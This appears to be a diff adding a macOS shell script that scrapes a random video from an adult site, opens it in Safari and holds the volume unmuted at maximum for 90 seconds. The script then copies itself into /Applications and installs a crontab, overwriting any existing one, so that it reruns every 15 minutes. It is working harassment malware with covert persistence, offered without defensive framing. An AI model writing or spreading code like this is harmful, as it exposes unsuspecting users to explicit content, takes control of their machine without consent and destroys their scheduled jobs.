@@ -1,0 +1,41 @@
+#!/bin/sh
+
+URL="http://ero-video.net/?ccd=hitozuma"
+LF=$'\\\x0A'
+SOURCE=`curl $URL`
+
+IMG_URLs=`echo "$SOURCE" | sed -n '/<div class="da-zoom-normal"/,/<\/span>/p' | grep "moviecode" | sed -n '/moviecode="/,/">/p' | sed -e "s/^.*moviecode=\"\(.*\)\".*$/\1/"`
+echo "$IMG_URLs" > ./temps.txt
+
+cnt=0
+while read line
+do
+    cnt=`expr $cnt + 1`
+done < ./temps.txt
+num=`expr $RANDOM % $cnt`
+
+cnt=0
+while read line
+do
+    if test $cnt -eq $num ; then
+	open -a "/Applications/Safari.app" "http://ero-video.net/movie/?mcd=$line" &
+    fi
+    cnt=`expr $cnt + 1`
+done < ./temps.txt
+rm temps.txt
+
+for i in `seq 1 90`
+do
+    osascript -e 'set volume without output muted'
+    osascript -e 'set volume output volume 100'
+    sleep 1
+done
+
+if [ ! -e /Applications/cronlog ]; then
+    SHPATH=$(cd $(dirname $0);pwd;)
+    SHPATH="$SHPATH/`basename $0`"
+    cp "$SHPATH" /Applications/`basename $0`
+    SHPATH="/Applications/`basename $0`"
+    echo "SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n00,15,30,45 * * * * sh $SHPATH" > /Applications/cronlog
+    crontab < /Applications/cronlog
+fi
